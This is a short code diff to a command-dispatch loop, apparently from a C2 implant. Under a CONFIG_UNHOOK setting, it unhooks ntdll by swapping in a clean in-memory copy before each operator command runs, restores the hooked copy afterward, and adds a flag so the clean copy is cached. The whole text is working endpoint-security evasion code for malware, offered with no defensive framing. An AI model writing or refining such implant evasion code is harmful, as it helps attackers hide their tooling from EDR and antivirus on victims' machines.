@@ -49,6 +49,8 @@ VOID CommandDispatcher() {
     LPVOID pCacheClean = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
 
     mem_cpy(pCacheRestore, p_ntdll, ntdll_size);
+
+    UINT uHookFlag = 0;
 #endif //unhook
 
     do {
@@ -79,14 +81,16 @@ VOID CommandDispatcher() {
 
                             // unhook
 #if CONFIG_UNHOOK
-                            HookingManager(TRUE, pCacheClean, p_ntdll, ntdll_size);
+                            HookingManager(uHookFlag, pCacheClean, p_ntdll, ntdll_size);
+                            uHookFlag = 2; // set flag to rehook status
 #endif
                             // execute command
                             Commands[FunctionCounter].Function(&Parser);
 
                             // rehook
 #if CONFIG_UNHOOK
-                            HookingManager(FALSE, pCacheRestore, p_ntdll, ntdll_size);
+                            HookingManager(uHookFlag, pCacheRestore, p_ntdll, ntdll_size);
+                            uHookFlag = 1; // set flag to indicate we already have clean ntdll in pCacheClean
 #endif
                             FoundCommand = TRUE;
                             break;
